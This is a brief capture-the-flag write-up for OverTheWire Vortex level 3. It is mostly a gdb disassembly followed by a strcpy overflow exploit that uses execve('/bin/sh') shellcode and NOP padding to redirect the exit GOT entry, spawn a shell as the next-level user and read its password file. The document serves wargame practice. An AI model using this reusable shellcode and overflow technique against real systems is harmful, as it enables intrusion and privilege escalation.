# Overthewire Vortex Level 3 Writeup

This one is a simplified one. But the pointer of pointer can be confused.

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804842d <+0>: push   %ebp
   0x0804842e <+1>: mov    %esp,%ebp
   0x08048430 <+3>: and    $0xfffffff0,%esp
   0x08048433 <+6>: sub    $0xa0,%esp
   0x08048439 <+12>:  movl   $0x8049748,0x9c(%esp)
   0x08048444 <+23>:  cmpl   $0x2,0x8(%ebp)
   0x08048448 <+27>:  je     0x8048456 <main+41>
   0x0804844a <+29>:  movl   $0x1,(%esp)
   0x08048451 <+36>:  call   0x8048310 <exit@plt>
   0x08048456 <+41>:  mov    0xc(%ebp),%eax
   0x08048459 <+44>:  add    $0x4,%eax
   0x0804845c <+47>:  mov    (%eax),%eax
   0x0804845e <+49>:  mov    %eax,0x4(%esp)
   0x08048462 <+53>:  lea    0x18(%esp),%eax
   0x08048466 <+57>:  mov    %eax,(%esp)
   0x08048469 <+60>:  call   0x80482f0 <strcpy@plt>
   0x0804846e <+65>:  mov    0x9c(%esp),%eax
   0x08048475 <+72>:  mov    $0x0,%ax
   0x08048479 <+76>:  cmp    $0x8040000,%eax
   0x0804847e <+81>:  je     0x804848c <main+95>
   0x08048480 <+83>:  movl   $0x2,(%esp)
   0x08048487 <+90>:  call   0x8048310 <exit@plt>
   0x0804848c <+95>:  mov    0x9c(%esp),%eax
   0x08048493 <+102>: mov    (%eax),%eax
---Type <return> to continue, or q <return> to quit---
   0x08048495 <+104>: mov    %eax,0x98(%esp)
   0x0804849c <+111>: mov    0x9c(%esp),%eax
   0x080484a3 <+118>: mov    (%eax),%eax
   0x080484a5 <+120>: lea    0x18(%esp),%edx
   0x080484a9 <+124>: mov    %edx,(%eax)
   0x080484ab <+126>: movl   $0x0,(%esp)
   0x080484b2 <+133>: call   0x8048310 <exit@plt>
End of assembler dump.
(gdb) disas 0x8048310
Dump of assembler code for function exit@plt:
   0x08048310 <+0>: jmp    *0x8049734
   0x08048316 <+6>: push   $0x10
   0x0804831b <+11>:  jmp    0x80482e0
End of assembler dump.
(gdb) quit
$ ./vortex3 `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*103+"\x12\x83\x04\x08"'`
Segmentation fault
$ ./vortex3 `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*103+"\x12\x83\x04\x08"*20'`
$ whoami
vortex4
$ cat /etc/vortex_pass/vortex4
```
